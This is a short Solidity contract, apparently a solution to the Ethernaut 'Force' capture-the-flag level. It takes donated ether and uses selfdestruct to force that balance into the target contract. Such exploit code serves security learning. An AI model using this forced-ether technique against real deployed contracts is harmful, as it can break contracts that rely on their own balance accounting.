// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../ethernaut/Force.sol";

contract HackForce {
    Force private immutable _force;

    constructor(address forceAddress) {
        _force = Force(forceAddress);
    }

    function donate() public payable {
        require(msg.value > 0, "Must send at least 1 wei");
    }

    function attack() public {
        require(address(this).balance > 0, "Balance is 0. Please donate in order to attack");
        selfdestruct(payable(address(_force)));
    }

}